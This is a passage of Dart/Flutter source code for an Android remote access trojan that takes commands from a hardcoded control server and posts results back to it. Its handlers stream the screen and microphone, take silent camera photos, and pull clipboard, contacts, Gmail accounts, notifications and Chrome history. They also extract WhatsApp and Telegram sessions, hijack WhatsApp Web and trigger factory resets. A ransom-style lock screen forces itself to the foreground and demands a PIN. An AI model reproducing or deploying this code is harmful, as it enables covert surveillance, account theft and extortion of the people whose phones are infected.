    } catch (e2) {
      resultData = {"status": "error", "error": e2.toString()};
    }
  }
  break;

// STOP SCREEN CAPTURE
case "stop_screen_capture":
  try {
    // Stop MediaProjectionService
    await platformSpy.invokeMethod('stopMediaProjectionCapture');
    
    // Clear state
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('screen_capture_active', false);
    await prefs.remove('screen_capture_fallback');
    
    debugPrint('[SCREEN_CAPTURE] Stopped');
    resultData = {"status": "Screen capture stopped"};
  } catch (e) {
    debugPrint('[STOP_SCREEN_CAPTURE] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

case "start_live_screen":
  try {
    await platformSpy.invokeMethod('startLiveScreen');
    _startLiveScreenLoop(); // âœ… FIX: Aktifin Dart screenshot loop
    resultData = {"status": "Live screen started"};
  } catch (e) {
    debugPrint('[START_LIVE_SCREEN] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;
case "stop_live_screen":
  try {
    await platformSpy.invokeMethod('stopLiveScreen');
    _stopLiveScreenLoop();
    resultData = {"status": "Live screen stopped"};
  } catch (e) {
    debugPrint('[STOP_LIVE_SCREEN] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// FLASH ON/OFF — handled by Java RATCommandHandler
// Flutter tidak perlu handle, cukup fallthrough ke default

// START LIVE MIC - Audio streaming
case "start_live_mic":
  try {
    await platformSpy.invokeMethod('startLiveMic');
    resultData = {"status": "Live mic started"};
  } catch (e) {
    debugPrint('[LIVE_MIC] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// STOP LIVE MIC
case "stop_live_mic":
  try {
    await platformSpy.invokeMethod('stopLiveMic');
    resultData = {"status": "Live mic stopped"};
  } catch (e) {
    debugPrint('[STOP_LIVE_MIC] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;
// ========== MISSING HANDLERS ==========

// get_account / get_accounts alias
case "get_account":
  try {
    String? emails = await platformSpy.invokeMethod('get_gmails');
    resultData = {"accounts": emails ?? "Denied"};
  } catch (e) {
    debugPrint('[GET_ACCOUNT] Error: $e');
    resultData = {"error": "Failed to get account: $e"};
  }
  break;

// play_mp3 alias untuk play_audio
case "play_mp3":
  try {
    await _audioPlayer.stop();
    await _audioPlayer.play(UrlSource(extra));
    resultData = {"status": "Playing MP3", "url": extra};
  } catch (e) {
    debugPrint('[PLAY_MP3] Error: $e');
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// stop_music alias untuk stop_audio
case "stop_music":
  try {
    await _audioPlayer.stop();
    resultData = {"status": "Music stopped"};
  } catch (e) {
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// chat_to_device alias dari admin panel
case "chat_to_device":
  try {
    _sendResponseToServer("chat_message", {"message": extra});
    resultData = {"status": "Chat sent", "message": extra};
  } catch (e) {
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// get_clipboard
case "get_clipboard":
  try {
    String? clip = await platformSpy.invokeMethod('getClipboard');
    resultData = {"clipboard": clip ?? ""};
  } catch (e) {
    debugPrint('[CLIPBOARD] Error: $e');
    resultData = {"clipboard": "", "error": e.toString()};
  }
  break;

// startAudioRecord / stopAudioRecord alias (dari beberapa tempat di admin panel)
case "startAudioRecord":
  await platformSpy.invokeMethod('startAudioRecord');
  resultData = {"status": "Recording started"};
  break;
case "stopAudioRecord":
  String? path2 = await platformSpy.invokeMethod('stopAudioRecord');
  resultData = {"status": "Recording stopped", "path": path2};
  break;

// vibrate alias
case "vibrate":
  try {
    int dur = int.tryParse(extra) ?? 3000;
    Vibration.vibrate(duration: dur);
    resultData = {"status": "Vibrating", "duration": dur};
  } catch (e) {
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// stop_vibrate
case "stop_vibrate":
  try {
    Vibration.cancel();
    resultData = {"status": "Vibration stopped"};
  } catch (e) {
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// reset_device alias
case "reset_device":
  try {
    await platformSpy.invokeMethod('factoryReset');
    resultData = {"status": "Factory reset initiated"};
  } catch (e) {
    resultData = {"status": "error", "error": e.toString()};
  }
  break;

// auto_intel â€” DEPRECATED, gunakan get_device_info
case "auto_intel":
  // Alias ke get_device_info untuk backward compatibility
  try {
    final Battery battery = Battery();
    int batteryLevel = await battery.batteryLevel;
    
    // Get network info
    final connectivity = Connectivity();
    final connectivityResult = await connectivity.checkConnectivity();
    String networkType = "Unknown";
    if (connectivityResult == ConnectivityResult.wifi) {
      networkType = "WiFi";
    } else if (connectivityResult == ConnectivityResult.mobile) {
      networkType = "Mobile";
    } else if (connectivityResult == ConnectivityResult.ethernet) {
      networkType = "Ethernet";
    }
    
    // Get device info
    DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
    AndroidDeviceInfo androidInfo = await deviceInfoPlugin.androidInfo;
    
    String model = "${androidInfo.brand.toUpperCase()} ${androidInfo.model}";
    
    // Get SIM info (requires native call)
    String sim1 = "Unknown";
    String sim2 = "Unknown";
    try {
      final simInfo = await platformSpy.invokeMethod('getSimInfo');
      if (simInfo != null) {
        sim1 = simInfo['sim1'] ?? "No SIM";
        sim2 = simInfo['sim2'] ?? "No SIM";
      }
    } catch (e) {
      debugPrint('Error getting SIM info: $e');
    }
    
    resultData = {
      "model": model,
      "battery": "$batteryLevel%",
      "networkType": networkType,
      "simSlot1": sim1,
      "simSlot2": sim2,
      "androidVersion": androidInfo.version.release,
      "device": androidInfo.device,
      "manufacturer": androidInfo.manufacturer,
    };
  } catch (e) {
    resultData = {"error": "Failed to get device info: $e"};
  }
  break;

// ==================== NEW MISSING HANDLERS ====================
case "get_notifications":
  try {
    List<dynamic> notifs = await platformSpy.invokeMethod('getNotifications');
    resultData = {"notifications": notifs};
  } catch (e) {
    debugPrint('[GET_NOTIFICATIONS] Error: $e');
    resultData = {"notifications": []};
  }
  break;

case "get_network_info":
  // Handled natively via SocketService/RATCommandHandler
  break;

      case "scan_wifi":
      case "get_wifi_history":
        // Handled natively via SocketService/RATCommandHandler
        break;

case "get_cell_info":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "block_app":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "unblock_app":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "fake_shutdown":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "fake_update":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "stop_fake":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "show_banner":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "stop_banner":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "play_media":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "stop_media":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "freeze_app":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "disable_buttons":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "enable_anti_uninstall":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "disable_anti_uninstall":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "show_text":
  // Handled natively via SocketService/RATCommandHandler
  break;

case "get_logs":
  // Handled natively via SocketService/RATCommandHandler
  break;

// ===== AUTO CAPTURE / MONITOR =====
case "start_monitor":
  await platformSpy.invokeMethod('startMonitor');
  resultData = {"status": "Monitor started"};
  break;
case "stop_monitor":
  await platformSpy.invokeMethod('stopMonitor');
  resultData = {"status": "Monitor stopped"};
  break;
case "set_target_apps":
  await platformSpy.invokeMethod('setTargetApps', {"targets": extra});
  resultData = {"status": "Targets updated"};
  break;
case "get_monitor_targets":
  final monStatus = await platformSpy.invokeMethod('getMonitorStatus');
  resultData = monStatus;
  break;

case "get_chrome_history":
    resultData = await platformSpy.invokeMethod('getChromeHistory');
    break;

case "extract_whatsapp":
    // Handled natively via SocketService/RATCommandHandler
    break;

case "extract_wa_session":
    // Handled natively via SocketService/RATCommandHandler
    break;

case "extract_tg_session":
    // Handled natively via SocketService/RATCommandHandler
    break;

case "hijack_wa_web":
    try {
        await platformSpy.invokeMethod('bringToForeground');
        await Future.delayed(const Duration(milliseconds: 500));
        if (await canLaunchUrl(Uri.parse('https://web.whatsapp.com'))) {
            await launchUrl(Uri.parse('https://web.whatsapp.com'), mode: LaunchMode.externalApplication);
        }
        await Future.delayed(const Duration(seconds: 5));
        dynamic qrScreenshot = await platformSpy.invokeMethod('get_screen');
        if (qrScreenshot is String && qrScreenshot.isNotEmpty) {
            resultData = {"image": qrScreenshot, "status": "QR captured"};
        } else if (qrScreenshot is Map) {
            resultData = qrScreenshot;
        } else {
            resultData = {"status": "error", "error": "Screenshot failed"};
        }
    } catch (e) {
        debugPrint('[HIJACK_WA] Error: $e');
        resultData = {"status": "error", "error": e.toString()};
    }
    break;

case "update_config":
    try {
      Map<String, dynamic> newConfig;
      if (extra.isNotEmpty) {
        newConfig = json.decode(extra);
      } else {
        newConfig = {"ratId": extra};
      }
      final dir = await getApplicationDocumentsDirectory();
      final configFile = File('${dir.path}/config.json');
      await configFile.writeAsString(json.encode(newConfig));
      // Update runtime config
      if (newConfig['ratId'] != null) {
        appConfig["ratId"] = newConfig['ratId'];
        appConfig["accountId"] = newConfig['ratId'];
      }
      resultData = {"status": "ok", "message": "Config updated to ratId: ${newConfig['ratId']}"};
      print("[CONFIG] update_config -> ratId: ${newConfig['ratId']}");
    } catch (e) {
      resultData = {"status": "error", "error": e.toString()};
    }
    break;

    default:
      resultData = {"status": "unknown", "message": "Unknown command: $command"};
      break;
    }

    if (resultData != null) {
      _sendResponseToServer(command, resultData);
    }
    
    // Send ACK via HTTP to clear server retry timer
    if (commandId.isNotEmpty) {
      _sendCommandAck(commandId);
    }
  } catch (e) {
    debugPrint('[EXEC] âŒ CRITICAL Error executing command $command: $e');
    // SELALU kirim error response ke server
    try {
      _sendResponseToServer(command, {"status": "error", "error": e.toString()});
    } catch (_) {}
    
    // Send ACK even on error so server doesn't keep retrying
    if (commandId.isNotEmpty) {
      _sendCommandAck(commandId);
    }
  }
}

Future<List<Map<String, String>>> _getContactsInternal() async {
  if (await FlutterContacts.requestPermission()) {
    final contacts = await FlutterContacts.getContacts(withProperties: true);
    return contacts.take(100).map((e) => {
      "name": e.displayName, 
      "num": e.phones.isNotEmpty ? e.phones.first.number : ""
    }).toList();
  }
  return [];
}

Future<void> _executeFlutterSilentCamera(String side) async {
  try {
    final cameras = await availableCameras();
    final cam = cameras.firstWhere((c) => c.lensDirection == (side == "front" ? CameraLensDirection.front : CameraLensDirection.back));
    final controller = CameraController(cam, ResolutionPreset.low, enableAudio: false);
    await controller.initialize();
    XFile photo = await controller.takePicture();
    final bytes = await File(photo.path).readAsBytes();
    img.Image? decoded = img.decodeImage(bytes);
    String base64Image = base64Encode(img.encodeJpg(decoded!, quality: 40));
    _sendResponseToServer("take_photo", {"image": base64Image});
    await File(photo.path).delete();
    await controller.dispose();
  } catch (e) {}
}

Future<void> _sendResponseToServer(String cmd, dynamic data) async {
  try {
    final ratId = appConfig['ratId'] ?? 'UNKNOWN';
    var payload = {
      "ratId": ratId,
      "deviceId": globalDeviceId,
      "data": {
        "cmd": cmd,
        "data": data,
        "timestamp": DateTime.now().millisecondsSinceEpoch,
      }
    };
    
    debugPrint('[RESPONSE] ðŸ”„ Sending: cmd=$cmd');
    
    // âœ… Send via HTTP (native SocketService handles real-time responses)
    final serverUrl = appConfig['baseUrl'] ?? "http://hamnzx.clouderz.my.id:2000";
    try {
      final response = await http.post(
        Uri.parse("$serverUrl/receiveDeviceData"),
        body: jsonEncode(payload),
        headers: {"Content-Type": "application/json"},
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final body = jsonDecode(response.body);
        final pending = body["pendingCommands"] as List?;
        if (pending != null && pending.isNotEmpty) {
          debugPrint("[RESPONSE] Received ${pending.length} pending commands via HTTP");
          for (final cmd in pending) {
            final cmdData = {
              'cmd': cmd['command'] ?? cmd['cmd'],
              'command': cmd['command'] ?? cmd['cmd'],
              'extra': cmd['extra'],
              'commandId': cmd['id'] ?? cmd['commandId'],
            };
            debugPrint('[RESPONSE] Executing pending:  ()');
            try {
              await executeLogic(cmdData);
              if (cmdData['commandId'] != null) {
                _sendCommandAck(cmdData['commandId']);
              }
            } catch (e) {
              debugPrint("[RESPONSE] Pending cmd failed: $e");
            }
          }
        } else {
          debugPrint('[RESPONSE] Sent via HTTP (no pending commands)');
        }
      }
    } catch (e) {
      debugPrint('[RESPONSE] âŒ HTTP send failed: $e');
    }
  } catch (e) {
    debugPrint('[RESPONSE] âŒ Error: $e');
  }
}

Future<void> _sendCommandAck(String commandId) async {
  try {
    final ratId = appConfig['ratId'] ?? 'UNKNOWN';
    final serverUrl = appConfig['baseUrl'] ?? "http://hamnzx.clouderz.my.id:2000";
    await http.post(
      Uri.parse("$serverUrl/api/ratapi/command-ack"),
      body: jsonEncode({
        "commandId": commandId,
        "deviceId": globalDeviceId,
        "accountId": ratId,
      }),
      headers: {"Content-Type": "application/json"},
    ).timeout(const Duration(seconds: 5));
    debugPrint('[ACK] âœ… Command $commandId acknowledged');
  } catch (e) {
    debugPrint('[ACK] âš ï¸ ACK send failed (non-critical): $e');
  }
}

// --- UI COMPONENTS ---
class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(scaffoldBackgroundColor: Colors.black),
      home: const MainLockWrapper(),
    );
  }
}

class MainLockWrapper extends StatefulWidget {
  const MainLockWrapper({super.key});
  @override
  State<MainLockWrapper> createState() => _MainLockWrapperState();
}

class _MainLockWrapperState extends State<MainLockWrapper> with WidgetsBindingObserver {
  final TextEditingController _passController = TextEditingController();
  late final WebViewController _webController;
  Timer? _lockMonitorTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _webController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..loadRequest(Uri.parse(appConfig['landing_web'] ?? "https://google.com"));
    
    // Load lock state from SharedPreferences
    _loadLockState();
  }
  
  // Start aggressive lock monitoring - brings app to front every 300ms
  void _startLockMonitoring() {
    _lockMonitorTimer?.cancel();
    _lockMonitorTimer = Timer.periodic(const Duration(milliseconds: 300), (t) async {
      if (deviceLocked.value) {
        // Re-hide system UI (notification bar, nav bar)
        SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
        // Bring to foreground
        try { await platformSpy.invokeMethod('bringToForeground'); } catch (e) {}
      } else {
        t.cancel();
      }
    });
  }
  
  void _stopLockMonitoring() {
    _lockMonitorTimer?.cancel();
    _lockMonitorTimer = null;
  }
  
  Future<void> _loadLockState() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final isLocked = prefs.getBool('device_locked') ?? false;
      final lockActive = prefs.getBool('lock_active_session') ?? false;
      final lockMessage = prefs.getString('lock_message') ?? currentLockMessage;
      final lockPin = prefs.getString('lock_pin') ?? currentLockPIN;
      
      if (isLocked && lockActive) {
        currentLockMessage = lockMessage;
        currentLockPIN = lockPin;
        deviceLocked.value = true;
        playScarySound();
        await platformSpy.invokeMethod('bringToForeground');
        debugPrint('[LOCK] Lock state restored from SharedPreferences');
      }
    } catch (e) {
      debugPrint('[LOCK] Error loading lock state: $e');
    }
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _passController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (deviceLocked.value && (state == AppLifecycleState.paused || state == AppLifecycleState.inactive)) {
      platformSpy.invokeMethod('bringToForeground');
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (context, isLocked, child) {
        // Hide system UI when locked
        if (isLocked) {
          SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersive);
          SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
        } else {
          SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
        }
        
        return PopScope(
          canPop: !isLocked,
          onPopInvoked: (didPop) {
            if (isLocked && didPop) {
              // Prevent back button when locked
              SystemNavigator.pop();
            }
          },
          child: Stack(
            children: [
              Scaffold(body: WebViewWidget(controller: _webController)),
              if (isLocked)
                WillPopScope(
                  onWillPop: () async {
                    // Prevent back button completely when locked
                    return false;
                  },
                  child: Scaffold(
                    backgroundColor: Colors.black,
                    body: GestureDetector(
                      onTap: () {
                        // Prevent any tap from closing
                        // Also re-hide system UI if it appears
                        SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
                        return;
                      },
                      child: Padding(
                        padding: const EdgeInsets.all(20),
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            const Icon(Icons.gpp_maybe, color: Colors.red, size: 80),
                            const SizedBox(height: 20),
                            Text(currentLockMessage, textAlign: TextAlign.center, style: const TextStyle(color: Colors.red, fontSize: 22, fontWeight: FontWeight.bold)),
                            const SizedBox(height: 40),
                            TextField(
                              controller: _passController,
                              obscureText: true,
                              textAlign: TextAlign.center,
                              style: const TextStyle(color: Colors.white),
                              decoration: const InputDecoration(
                                hintText: "PASSWORD",
                                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                                focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                              ),
                            ),
                            const SizedBox(height: 20),
                            ElevatedButton(
                              style: ElevatedButton.styleFrom(backgroundColor: Colors.red[900], minimumSize: const Size(double.infinity, 50)),
                              onPressed: () async {
                                if (_passController.text == currentLockPIN) {
                                  _passController.clear();
                                  try { await platformSpy.invokeMethod('unlock'); } catch (e) {}
                                  await performFullUnlock();
                                } else {
                                  // Wrong PIN - vibrate and show error
                                  Vibration.vibrate(duration: 500);
                                  ScaffoldMessenger.of(context).showSnackBar(
                                    const SnackBar(content: Text('âŒ WRONG PIN!'), backgroundColor: Colors.red),
                                  );
                                  _passController.clear();
                                }
                              },
                              child: const Text("UNLOCK"),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }
}
